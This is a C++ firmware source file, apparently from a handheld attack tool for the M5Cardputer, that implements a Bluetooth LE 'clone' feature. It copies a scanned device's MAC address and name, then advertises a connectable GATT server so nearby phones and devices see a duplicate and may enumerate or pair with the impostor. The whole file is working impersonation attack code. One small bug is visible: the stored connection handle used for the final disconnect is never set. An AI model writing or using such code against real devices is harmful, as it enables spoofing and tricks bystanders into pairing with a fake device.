/*
 * ble_clone — rebroadcast a scanned device's identity.
 *
 * Sets the adapter's random MAC to the target's MAC, advertises with
 * the target's name + a generic flags byte. Target devices elsewhere
 * in range may see two "instances" of the same MAC, causing dedup
 * collisions and pairing prompts on subscribers.
 *
 * Requires g_ble_target_valid (set by ENTER on a scan result).
 */
#include "app.h"
#include "ui.h"
#include "input.h"
#include "radio.h"
#include "ble_types.h"
#include <NimBLEDevice.h>

/* Connection tracking. */
static volatile uint32_t s_conn_count = 0;
static volatile bool     s_currently_connected = false;
static volatile uint16_t s_last_conn_handle = 0;

class clone_srv_cb : public NimBLEServerCallbacks {
    void onConnect(NimBLEServer *srv) override {
        (void)srv;
        s_conn_count++;
        s_currently_connected = true;
        NimBLEDevice::startAdvertising();
    }
    void onDisconnect(NimBLEServer *srv) override {
        (void)srv;
        s_currently_connected = false;
        NimBLEDevice::startAdvertising();
    }
};
static clone_srv_cb s_srv_cb;

class clone_chr_cb : public NimBLECharacteristicCallbacks {
    void onRead(NimBLECharacteristic *chr) override  { (void)chr; }
    void onWrite(NimBLECharacteristic *chr) override { (void)chr; }
};
static clone_chr_cb s_chr_cb;

void feat_ble_clone(void)
{
    if (!g_ble_target_valid) {
        ui_toast("scan + select first", COL_WARN, 1200);
        return;
    }
    radio_switch(RADIO_BLE);

    /* Force random static MAC to the target's (byte-reversed). */
    uint8_t mac[6];
    for (int i = 0; i < 6; ++i) mac[i] = g_ble_target.addr[5 - i];
    mac[5] |= 0xC0;
    ble_hs_id_set_rnd(mac);
    NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);

    /* Create a GATT server with a minimal service so phones/targets
     * can connect and enumerate us. Without any services at all many
     * stacks reject the connection immediately. */
    s_conn_count = 0;
    s_currently_connected = false;
    NimBLEServer *srv = NimBLEDevice::createServer();
    srv->setCallbacks(&s_srv_cb);

    /* Generic service + RW characteristic — enough to pass enumeration. */
    NimBLEService *svc = srv->createService("181C"); /* User Data */
    NimBLECharacteristic *chr = svc->createCharacteristic(
        "2A25", /* Serial Number String */
        NIMBLE_PROPERTY::READ | NIMBLE_PROPERTY::WRITE | NIMBLE_PROPERTY::NOTIFY);
    chr->setValue((uint8_t *)"POSEIDON", 8);
    chr->setCallbacks(&s_chr_cb);
    svc->start();

    /* Connectable advertising data: flags + name + HID-ish appearance. */
    NimBLEAdvertisementData data;
    if (g_ble_target.name[0]) data.setName(g_ble_target.name);
    data.setFlags(BLE_HS_ADV_F_DISC_GEN | BLE_HS_ADV_F_BREDR_UNSUP);
    data.setCompleteServices(NimBLEUUID("181C"));

    NimBLEAdvertising *adv = NimBLEDevice::getAdvertising();
    adv->setAdvertisementData(data);
    /* BLE_GAP_CONN_MODE_UND = undirected connectable */
    adv->setAdvertisementType(BLE_GAP_CONN_MODE_UND);
    adv->setMinInterval(0x20);
    adv->setMaxInterval(0x40);
    adv->start();

    ui_clear_body();
    auto &d = M5Cardputer.Display;
    d.setTextColor(COL_BAD, COL_BG);
    d.setCursor(4, BODY_Y + 2); d.print("BLE CLONE");
    d.drawFastHLine(4, BODY_Y + 12, 80, COL_BAD);
    d.setTextColor(COL_FG, COL_BG);
    d.setCursor(4, BODY_Y + 22);
    d.printf("MAC : %02X:%02X:%02X:%02X:%02X:%02X",
             g_ble_target.addr[0], g_ble_target.addr[1], g_ble_target.addr[2],
             g_ble_target.addr[3], g_ble_target.addr[4], g_ble_target.addr[5]);
    d.setCursor(4, BODY_Y + 34);
    d.printf("NAME: %.30s", g_ble_target.name[0] ? g_ble_target.name : "(none)");

    ui_draw_footer("`=stop");
    ui_draw_status(radio_name(), "clone");

    uint32_t last = 0;
    while (true) {
        if (millis() - last > 250) {
            last = millis();
            d.fillRect(0, BODY_Y + 50, SCR_W, 40, COL_BG);
            d.setTextColor(s_currently_connected ? COL_GOOD : COL_WARN, COL_BG);
            d.setCursor(4, BODY_Y + 50);
            d.print(s_currently_connected ? "CONNECTED" : "ADVERTISING");
            d.setTextColor(COL_FG, COL_BG);
            d.setCursor(4, BODY_Y + 62);
            d.printf("connects: %lu", (unsigned long)s_conn_count);
            d.setTextColor(COL_DIM, COL_BG);
            d.setCursor(4, BODY_Y + 74);
            d.print("targets can enumerate + pair");
            ui_draw_status(radio_name(), s_currently_connected ? "paired" : "clone");
        }
        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(30); continue; }
        if (k == PK_ESC) break;
    }
    adv->stop();
    if (s_currently_connected) ble_gap_terminate(s_last_conn_handle, 0x13);
}
